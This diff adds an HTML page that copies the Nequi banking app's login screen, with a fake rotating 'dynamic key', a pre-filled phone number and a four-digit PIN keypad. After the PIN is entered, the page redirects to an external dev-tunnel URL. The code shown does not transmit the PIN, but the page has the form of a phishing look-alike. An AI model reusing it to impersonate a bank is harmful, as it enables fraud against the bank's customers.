@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.7/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-LN+7fdVzj6u52u30Kp6M/trliBMCMKTyK833zpbD+pXdCLuTusPj697FH4R/5mcr"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.7/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-ndDqU0Gzau9qJ1lfW4pNLlhNTkCfHzAVBReH9diLvGRem5+R9g2FzA8ZGN954O5Q"
+      crossorigin="anonymous"
+    ></script>
+    
+    <!-- Fuentes optimizadas para números geométricos -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <!-- SF Pro Display: Números geométricos modernos -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <!-- Nunito Sans: Números redondos y geométricos -->
+    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <!-- Work Sans: Números geométricos limpios -->
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <!-- Outfit: Números geométricos modernos -->
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <!-- Roboto base -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+    
+    <title>Nequi - Clave Dinámica</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", 
+          Helvetica, Arial, sans-serif;
+        background: #240123;
+        height: 100vh;
+        overflow: hidden;
+        position: relative;
+      }
+
+      .container {
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        max-width: 400px;
+        margin: 0 auto;
+        position: relative;
+      }
+
+      /* Header */
+      .header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+        padding: 5px;
+        padding-top: 5px;
+      }
+
+      .help-icon {
+        width: 28px;
+        height: 28px;
+        border: 2px solid rgba(255, 255, 255, 0.4);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-size: 19px;
+        font-weight: 500;
+        font-family: 'Inter', sans-serif;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        margin-top: 2%;
+        margin-left: -1%;
+      }
+
+      .dynamic-key-info {
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(10px);
+        border-radius: 4px;
+        padding: 0px 16px;
+        display: grid;
+        grid-template-columns: 1fr 1fr 1fr 1fr;
+        align-items: center;
+        gap: 10px;
+        width: 250px;
+        margin-top: 2%;
+        border: none;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      }
+
+      .key-circle {
+        width: 25px;
+        height: 25px;
+        position: relative;
+        border-radius: 50%;
+        background: conic-gradient(
+          from 0deg,
+          #ff1493 0%,
+          #ff1493 var(--progress, 0%),
+          rgba(255, 255, 255, 0.2) var(--progress, 0%),
+          rgba(255, 255, 255, 0.2) 100%
+        );
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background-color: white;
+      }
+
+      .key-circle::after {
+        content: "";
+        position: absolute;
+        top: 5px;
+        left: 5px;
+        right: 5px;
+        bottom: 5px;
+        background: #2a1639;
+        border-radius: 50%;
+      }
+
+      .key-info {
+        flex: 1;
+      }
+
+      .key-text {
+        color: white;
+        font-size: 14px;
+        font-weight: 400;
+        font-family: 'Inter', sans-serif;
+        margin-bottom: 2px;
+      }
+
+      .key-number {
+        color: white;
+        font-size: 20px;
+        font-weight: 600;
+        letter-spacing: 1.5px;
+        font-family: 'Outfit', 'Inter', sans-serif;
+        font-feature-settings: 'tnum' 1, 'lnum' 1;
+      }
+
+      .copy-icon {
+        width: 28px;
+        height: 28px;
+        border: 1px solid rgba(255, 255, 255, 0.4);
+        border-radius: 4px;
+        color: white;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 16px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+
+      .copy-icon svg {
+        transform: rotate(90deg);
+      }
+
+      .copy-icon:hover {
+        background: rgba(255, 255, 255, 0.2);
+      }
+
+      /* Main Content */
+      .main-content {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 0 20px;
+        position: relative;
+      }
+
+      .nequi-logo {
+        font-size: 120px;
+        font-weight: 300;
+        color: white;
+        letter-spacing: -4px;
+        margin-top: 70%;
+        margin-bottom: 0px;
+        position: relative;
+        font-family: 'Inter', sans-serif;
+        font-weight: 700;
+        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+      }
+
+      .nequi-logo::before {
+        content: "";
+        position: absolute;
+        left: -20px;
+        top: 30px;
+        width: 15px;
+        height: 15px;
+        background: #ff1493;
+        border-radius: 4px;
+      }
+
+      /* Phone Input */
+      .phone-section {
+        position: absolute;
+        bottom: 180px;
+        left: 20px;
+        right: 20px;
+        top: 72%;
+      }
+
+      .phone-input {
+        background: #4d334f;
+        backdrop-filter: blur(10px);
+        border-radius: 5px;
+        padding: 14px 14px;
+        width: 100%;
+        margin-bottom: 15px;
+        border: none;
+        color: white;
+        font-size: 18px;
+        font-weight: 400;
+        font-family: 'Outfit', 'Inter', monospace;
+        letter-spacing: 1px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        font-feature-settings: 'tnum' 1, 'lnum' 1;
+      }
+
+      .phone-input::placeholder {
+        color: rgba(255, 255, 255, 0.7);
+        font-family: 'Outfit', 'Inter', monospace;
+        font-feature-settings: 'tnum' 1, 'lnum' 1;
+      }
+
+      .phone-input:focus {
+        outline: none;
+        border-color: #ff1493;
+      }
+
+      /* Button Container */
+      .button-container {
+        display: flex;
+        gap: 6px;
+      }
+
+      /* Call Button */
+      .call-button {
+        background: #ff1493;
+        border: none;
+        border-radius: 5px;
+        flex: 1;
+        height: 50px;
+        color: white;
+        font-size: 17px;
+        font-weight: 600;
+        font-family: 'Inter', sans-serif;
+        cursor: pointer;
+        position: relative;
+        overflow: hidden;
+        transition: all 0.3s ease;
+        box-shadow: 0 4px 15px rgba(255, 20, 147, 0.3);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .call-button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 25px rgba(255, 20, 147, 0.4);
+      }
+
+      /* Money Button */
+      .money-button {
+        width: 55px;
+        height: 50px;
+        background: linear-gradient(135deg, #ff1493, #ff69b4);
+        border: none;
+        border-radius: 5px;
+        color: white;
+        font-size: 24px;
+        font-weight: 500;
+        font-family: 'Inter', sans-serif;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: all 0.3s ease;
+        box-shadow: 0 4px 15px rgba(255, 20, 147, 0.3);
+      }
+
+      .money-button:hover {
+        transform: scale(1.05);
+      }
+
+      /* Footer */
+      .footer {
+        position: absolute;
+        bottom: 30px;
+        left: 50%;
+        transform: translateX(-50%);
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        color: rgba(255, 255, 255, 0.6);
+        font-size: 14px;
+        font-family: 'Inter', sans-serif;
+        font-weight: 400;
+      }
+
+      
+
+      .footer-icon {
+        width: 15px;
+        height: 15px;
+        background: rgba(255, 255, 255, 0.2);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 12px;
+        font-family: 'Inter', sans-serif;
+      }
+
+      /* PIN Screen */
+      .pin-screen {
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: linear-gradient(135deg, #2a1639 0%, #4a2c5a 100%);
+        display: none;
+        flex-direction: column;
+        z-index: 100;
+      }
+
+      .pin-header {
+        padding: 3px 2px 30px;
+        display: flex;
+        align-items: center;
+      }
+
+      .back-arrow {
+        color: white;
+        font-size: 24px;
+        font-family: 'Inter', sans-serif;
+        cursor: pointer;
+        margin-right: 20px;
+        padding: 8px;
+        border-radius: 50%;
+        transition: all 0.3s ease;
+      }
+
+      .back-arrow:hover {
+        background: rgba(255, 255, 255, 0.1);
+      }
+
+      .pin-title {
+        color: white;
+        font-size: 24px;
+        font-weight: 400;
+        font-family: 'Inter', sans-serif;
+      }
+
+      .pin-content {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 50px 20px;
+      }
+
+      .pin-dots {
+        display: flex;
+        gap: 15px;
+        margin-bottom: 30px;
+      }
+
+      .pin-dot {
+        width: 50px;
+        height: 50px;
+        background: white;
+        border-radius: 10px;
+        transition: all 0.3s ease;
+        border: 2px solid rgba(255, 255, 255, 0.2);
+      }
+
+      .pin-dot.filled {
+        text-align: center;
+        font-size: 40px;
+        color: #ff1493;
+        justify-content: center;
+         font-family: 'Outfit', 'Inter', monospace;
+         font-weight: bold;
+       
+      }
+
+      .pin-message {
+        text-align: center;
+        color: rgba(255, 255, 255, 0.8);
+        font-size: 16px;
+        font-family: 'Inter', sans-serif;
+        font-weight: 400;
+        line-height: 1.4;
+        margin-bottom: 60px;
+      }
+
+      .keypad {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 20px;
+        width: 100%;
+        max-width: 250px;
+        margin-bottom: 40px;
+      }
+
+      .key {
+        width: 70px;
+        height: 70px;
+        background: transparent;
+        border: none;
+        color: white;
+        font-size: 36px;
+        font-weight: 300;
+        font-family: 'Outfit', 'Work Sans', 'Inter', sans-serif;
+        cursor: pointer;
+        border-radius: 50%;
+        transition: all 0.2s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-feature-settings: 'tnum' 1, 'lnum' 1;
+        line-height: 1;
+      }
+
+      
+
+      .key:hover {
+        background: rgba(255, 255, 255, 0.1);
+        border-color: rgba(255, 255, 255, 0.4);
+      }
+
+      .key:active {
+        transform: scale(0.95);
+      }
+
+      .key-delete {
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+        font-weight: 400;
+        font-size: 50%;
+      }
+
+      .forgot-pin {
+        color: white;
+        text-decoration: underline;
+        font-size: 16px;
+        font-family: 'Inter', sans-serif;
+        font-weight: 400;
+        cursor: pointer;
+      }
+
+      /* Loading Screen */
+      .loading-screen {
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: #f5f5f5;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        z-index: 200;
+      }
+
+      /* Animación del cuadrado dividido */
+      .loading-square {
+        width: 80px;
+        height: 80px;
+        position: relative;
+        display: flex;
+        flex-wrap: wrap;
+      }
+
+      .square-part {
+        width: 40px;
+        height: 40px;
+        background: #ff1493;
+        position: absolute;
+      }
+
+      .square-part.part1 {
+        top: 0;
+        left: 0;
+        animation: moveSquarePart1 2s infinite ease-in-out;
+      }
+
+      .square-part.part2 {
+        top: 0;
+        right: 0;
+        animation: moveSquarePart2 2s infinite ease-in-out;
+      }
+
+      .square-part.part3 {
+        bottom: 0;
+        left: 0;
+        animation: moveSquarePart3 2s infinite ease-in-out;
+      }
+
+      .square-part.part4 {
+        bottom: 0;
+        right: 0;
+        animation: moveSquarePart4 2s infinite ease-in-out;
+      }
+
+      @keyframes moveSquarePart1 {
+        0%, 100% {
+          transform: translate(0, 0);
+        }
+        25% {
+          transform: translate(20px, -20px);
+        }
+        50% {
+          transform: translate(40px, 0);
+        }
+        75% {
+          transform: translate(20px, 20px);
+        }
+      }
+
+      @keyframes moveSquarePart2 {
+        0%, 100% {
+          transform: translate(0, 0);
+        }
+        25% {
+          transform: translate(-20px, -20px);
+        }
+        50% {
+          transform: translate(-40px, 0);
+        }
+        75% {
+          transform: translate(-20px, 20px);
+        }
+      }
+
+      @keyframes moveSquarePart3 {
+        0%, 100% {
+          transform: translate(0, 0);
+        }
+        25% {
+          transform: translate(20px, 20px);
+        }
+        50% {
+          transform: translate(40px, 0);
+        }
+        75% {
+          transform: translate(20px, -20px);
+        }
+      }
+
+      @keyframes moveSquarePart4 {
+        0%, 100% {
+          transform: translate(0, 0);
+        }
+        25% {
+          transform: translate(-20px, 20px);
+        }
+        50% {
+          transform: translate(-40px, 0);
+        }
+        75% {
+          transform: translate(-20px, -20px);
+        }
+      }
+
+      /* Mejoras específicas para números geométricos */
+      .geometric-numbers {
+        font-family: 'Outfit', 'Work Sans', 'Inter', sans-serif;
+        font-feature-settings: 'tnum' 1, 'lnum' 1;
+        font-variant-numeric: tabular-nums lining-nums;
+      }
+
+      /* Responsive */
+      @media (max-width: 480px) {
+        .container {
+          max-width: 100%;
+        }
+
+        .nequi-logo {
+          font-size: 100px;
+        }
+
+        .dynamic-key-info {
+          width: 50%;
+          padding: 1px;
+          margin-right: 20px;
+        }
+
+        .key {
+          font-size: 32px;
+        }
+      }
+
+
+
+
+
+       .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid transparent;
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .call-button.loading .button-text {
+            opacity: 0;
+        }
+
+        .call-button.loading .loading-spinner {
+            display: block;
+        }
+
+        /* Pantalla PIN (oculta inicialmente) */
+        .pin-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .pin-container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .pin-input {
+            font-size: 24px;
+            padding: 10px;
+            margin: 20px 0;
+            text-align: center;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            width: 200px;
+        }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <!-- Main Screen -->
+      <div class="main-screen">
+        <div class="header">
+          <div class="help-icon">?</div>
+          <div class="dynamic-key-info">
+            <div class="key-circle" id="progressCircle"></div>
+
+            <div class="key-text" style="font-size: 11px; text-align: center">
+              Clave dinámica
+            </div>
+            <div class="key-number geometric-numbers" id="dynamicKey">392150</div>
+
+            <div class="copy-icon" onclick="copyToClipboard()">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-copy" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1z"/>
+              </svg>
+            </div>
+          </div>
+        </div>
+
+        <div class="main-content">
+          <div class="nequi-logo">Nequı</div>
+        </div>
+
+        <div class="phone-section">
+          <input
+            type="tel"
+            class="phone-input geometric-numbers"
+            placeholder="+57 | 304 441 7681"
+            value="+57 | 304 441 7681"
+          />
+          <div class="button-container">
+             <button class="call-button" onclick="showLoadingAndPin()">
+            <span class="button-text">Entra</span>
+            <div class="loading-spinner"></div>
+        </button>
+            <button class="money-button">$</button>
+          </div>
+        </div>
+
+        <div class="footer">
+          <img src="./src/by.svg" alt="">
+        </div>
+      </div>
+
+      <!-- PIN Screen -->
+      <div class="pin-screen" id="pinScreen">
+        <div class="pin-header">
+          <div class="back-arrow"  onclick="goBack()">←</div><br>
+          <div class="pin-title">Escribe tu clave</div>
+        </div>
+
+        <div class="pin-content">
+          <div class="pin-dots">
+            <div class="pin-dot" id="dot1"></div>
+            <div class="pin-dot" id="dot2"></div>
+            <div class="pin-dot" id="dot3"></div>
+            <div class="pin-dot" id="dot4"></div>
+          </div>
+
+          <div class="pin-message">
+            No dudamos que seas tú...<br />
+            Pero es mejor confirmar ;)
+          </div>
+
+          <div class="keypad">
+            <button class="key geometric-numbers" onclick="addDigit('1')">1</button>
+            <button class="key geometric-numbers" onclick="addDigit('2')">2</button>
+            <button class="key geometric-numbers" onclick="addDigit('3')">3</button>
+            <button class="key geometric-numbers" onclick="addDigit('4')">4</button>
+            <button class="key geometric-numbers" onclick="addDigit('5')">5</button>
+            <button class="key geometric-numbers" onclick="addDigit('6')">6</button>
+            <button class="key geometric-numbers" onclick="addDigit('7')">7</button>
+            <button class="key geometric-numbers" onclick="addDigit('8')">8</button>
+            <button class="key geometric-numbers" onclick="addDigit('9')">9</button>
+            <button class="key"></button>
+            <button class="key geometric-numbers" onclick="addDigit('0')">0</button>
+            <button  style=" background: transparent;" class="key key-delete" onclick="deleteDigit()"><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" fill="currentColor" class="bi bi-backspace-fill"   viewBox="0 0 16 16">
+            <path d="M15.683 3a2 2 0 0 0-2-2h-7.08a2 2 0 0 0-1.519.698L.241 7.35a1 1 0 0 0 0 1.302l4.843 5.65A2 2 0 0 0 6.603 15h7.08a2 2 0 0 0 2-2zM5.829 5.854a.5.5 0 1 1 .707-.708l2.147 2.147 2.146-2.147a.5.5 0 1 1 .707.708L9.39 8l2.146 2.146a.5.5 0 0 1-.707.708L8.683 8.707l-2.147 2.147a.5.5 0 0 1-.707-.708L7.976 8z"/>
+            </svg></button>
+          </div>
+
+          <div class="forgot-pin">¿Se te olvidó?</div>
+        </div>
+      </div>
+
+      <!-- Loading Screen -->
+      <div class="loading-screen" id="loadingScreen">
+        <div class="loading-square">
+          <div class="square-part part1"></div>
+          <div class="square-part part2"></div>
+          <div class="square-part part3"></div>
+          <div class="square-part part4"></div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      let currentPin = "";
+      let keyUpdateInterval;
+      let progressInterval;
+      let startTime;
+
+      // Generate random dynamic key
+      function generateDynamicKey() {
+        return Math.floor(100000 + Math.random() * 900000);
+      }
+
+      // Initialize with random key
+      document.addEventListener("DOMContentLoaded", function () {
+        updateDynamicKey();
+        startProgressTimer();
+      });
+
+    //   function showLoadingAndPin() {
+    //     const loadingScreen = document.getElementById("loadingScreen");
+    //     const pinScreen = document.getElementById("pinScreen");
+
+    //     // Show loading screen
+    //     loadingScreen.style.display = "flex";
+
+    //     // After 2 seconds, hide loading and show PIN screen
+    //     setTimeout(() => {
+    //       loadingScreen.style.display = "none";
+    //       pinScreen.style.display = "flex";
+    //     }, 2000);
+    //   }
+
+         function showLoadingAndPin() {
+            const button = document.querySelector('.call-button');
+            const pinScreen = document.getElementById("pinScreen");
+            
+            // Deshabilitar el botón y mostrar loading
+            button.disabled = true;
+            button.classList.add('loading');
+            
+            // Después de 2 segundos, quitar loading y mostrar PIN
+            setTimeout(() => {
+                button.disabled = false;
+                button.classList.remove('loading');
+                pinScreen.style.display = "flex";
+            }, 2000);
+        }
+
+        function closePinScreen() {
+            const pinScreen = document.getElementById("pinScreen");
+            pinScreen.style.display = "none";
+        }
+
+      function goBack() {
+        const pinScreen = document.getElementById("pinScreen");
+        pinScreen.style.display = "none";
+        currentPin = "";
+        updateDots();
+      }
+
+    function addDigit(digit) {
+        
+    const loadingScreen = document.getElementById("loadingScreen");
+  if (currentPin.length < 4) {
+    currentPin += digit;
+    updateDots();
+
+    if (currentPin.length === 4) {
+      // Mostrar loading en el próximo frame visual
+      setTimeout(() => {
+        loadingScreen.style.display = "flex";
+
+        // Ahora sí, espera 3 segundos para redirigir
+        setTimeout(() => {
+          currentPin = "";
+          updateDots();
+          loadingScreen.style.display = "none";
+          location.href = "https://zsbrccrd-443.use2.devtunnels.ms/practicas/h.html";
+        }, 3000);
+
+      }, 100); // Pequeño delay para asegurar que se renderice el DOM
+    }
+  }
+}
+
+      function deleteDigit() {
+        if (currentPin.length > 0) {
+          currentPin = currentPin.slice(0, -1);
+          updateDots();
+        }
+      }
+
+    function updateDots() {
+    for (let i = 1; i <= 4; i++) {
+        const dot = document.getElementById("dot" + i);
+        if (i <= currentPin.length) {
+        dot.classList.add("filled");
+        dot.textContent = '*';
+        } else {
+        dot.classList.remove("filled");
+        dot.textContent = ''; 
+        }
+    }
+    }
+
+
+      // Generate new dynamic key
+      function updateDynamicKey() {
+        const keyElement = document.getElementById("dynamicKey");
+        const newKey = generateDynamicKey();
+        keyElement.textContent = newKey;
+
+        // Reset progress
+        startTime = Date.now();
+        updateProgress();
+      }
+
+      // Update progress circle
+      function updateProgress() {
+        const progressCircle = document.getElementById("progressCircle");
+        const elapsed = Date.now() - startTime;
+        const progress = (elapsed / 100000) * 1000; 
+
+        progressCircle.style.setProperty("--progress", progress + "%");
+
+        if (progress >= 100) {
+          updateDynamicKey(); // Generate new key
+        }
+      }
+
+      // Start progress timer
+      function startProgressTimer() {
+        startTime = Date.now();
+
+        // Update every second
+        progressInterval = setInterval(updateProgress, 1000);
+
+        // Update key every 5 minutes
+        keyUpdateInterval = setInterval(updateDynamicKey, 100000);
+      }
+
+      // Copy to clipboard function
+      function copyToClipboard() {
+        const keyNumber = document.getElementById("dynamicKey").textContent;
+        navigator.clipboard
+          .writeText(keyNumber)
+          .then(() => {
+            const copyIcon = document.querySelector(".copy-icon");
+            copyIcon.style.transform = "scale(1.1)";
+            copyIcon.style.background = "rgba(255, 255, 255, 0.3)";
+
+            setTimeout(() => {
+              copyIcon.style.transform = "";
+              copyIcon.style.background = "";
+            }, 200);
+          })
+          .catch((err) => {
+            console.log("Error al copiar: ", err);
+          });
+      }
+
+      // Add touch feedback for mobile
+      document
+        .querySelectorAll(".key, .call-button, .money-button")
+        .forEach((button) => {
+          button.addEventListener("touchstart", function () {
+            this.style.transform = "scale(0.95)";
+          });
+
+          button.addEventListener("touchend", function () {
+            this.style.transform = "";
+          });
+        });
+    </script>
+  </body>
+</html>
